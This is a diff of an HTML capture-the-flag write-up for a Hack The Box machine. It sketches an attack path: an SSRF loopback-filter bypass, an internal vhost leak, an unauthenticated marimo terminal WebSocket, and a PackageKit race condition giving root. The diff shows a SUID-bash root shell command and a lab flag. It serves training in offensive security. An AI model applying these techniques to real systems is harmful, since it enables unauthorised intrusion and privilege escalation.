-          <li><strong>PackageKit TOCTOU (CVE-2026-41651)</strong> is a clean local privilege escalation on affected versions. Look for held / outdated PackageKit packages during post-exploitation enumeration.</li>
-        </ul>
-      </div>
-    </section>
-
-    <!-- Summary -->
-    <section class="phase">
-      <div class="phase-header">
-        <div class="phase-num">∑</div>
-        <h2>Attack Path Summary</h2>
-      </div>
-
-      <pre>External (80/443 nginx)
-  └─ /api/validate SSRF
-       └─ loopback filter bypass (0.0.0.0 / 127.1 / decimal)
-            └─ /status → leaks vhost nb-*.cohort.htb → 127.0.0.1:8888
-                 └─ Marimo /terminal/ws (unauthenticated WebSocket)
-                      └─ shell as marimo
-                           └─ PackageKit TOCTOU race (CVE-2026-41651)
-                                └─ SUID bash → root</pre>
-    </section>
-
-  </main>
-
-  <footer>
-    HTB Cohort Writeup · Correct path (SSRF → Marimo → PackageKit) · 2026
-  </footer>
+<div class="callout callout-warn">
+<span class="callout-label">Don't panic at the error</span>
+The "Failed to obtain authentication" message is expected — it's from the second <code>InstallFiles</code> call attempting polkit auth. The race already succeeded before that error appears.
 </div>
 
-<script>
-  function checkPw() {
-    const input = document.getElementById('pw').value.trim().toLowerCase();
-    // Password is the machine name
-    if (input === 'cohort') {
-      document.getElementById('gate').style.display = 'none';
-      document.getElementById('content').style.display = 'block';
-      window.scrollTo(0, 0);
-    } else {
-      document.getElementById('err').style.display = 'block';
-    }
-  }
+<h3>Root Shell</h3>
+<pre><code><span class="cmd">marimo@cohort:/tmp$ /tmp/.suid_bash -p -c 'id; cat /root/root.txt'</span>
+<span class="output">uid=1000(marimo) gid=1000(marimo) <span class="highlight">euid=0(root)</span>
+e6d15f33ae685873a025f0247af4a3f6</span></code></pre>
 
-  document.getElementById('pw').addEventListener('keydown', function(e) {
-    if (e.key === 'Enter') checkPw();
-  });
-</script>
 
-</body>
-</html>
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>String-based SSRF filters are weak.</strong><p>Alternative representations of localhost (<code>0.0.0.0</code>, <code>127.1</code>, decimal, hex, octal) frequently bypass them.</p></div>
+<div class="takeaway-item"><strong>Internal status/debug endpoints are gold.</strong><p>Once you have SSRF, always probe <code>/status</code>, <code>/health</code>, <code>/metrics</code>, <code>/env</code>. The <code>/status</code> endpoint leaked the internal marimo vhost name.</p></div>
+<div class="takeaway-item"><strong>Wildcard certificates hint at hidden vhosts.</strong><p>The leaked upstream name must be used as the <code>Host</code> header — connecting by IP alone won't route to the right service.</p></div>
+<div class="takeaway-item"><strong>Modern notebook tools can expose unauthenticated terminals.</strong><p>marimo's <code>/terminal/ws</code> had no auth check. Always test WebSocket endpoints even when the web UI requires login.</p></div>
+<div class="takeaway-item"><strong>PackageKit TOCTOU (CVE-2026-41651) is a clean local privesc.</strong><p>Look for held/outdated PackageKit packages during post-exploitation. The race is near-deterministic due to GLib's priority ordering.</p></div>
+</div>
+
+<div class="diagram">
+<span class="node node-green">SSRF bypass</span><span class="arrow">→</span><span class="node node-green">/status vhost leak</span><span class="arrow">→</span><span class="node node-blue">marimo /terminal/ws</span><span class="arrow">→</span><span class="node node-blue">shell as marimo</span><span class="arrow">→</span><span class="node node-red">PackageKit TOCTOU → root</span>
+</div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Cohort Writeup · 2026</footer>
+</body></html>
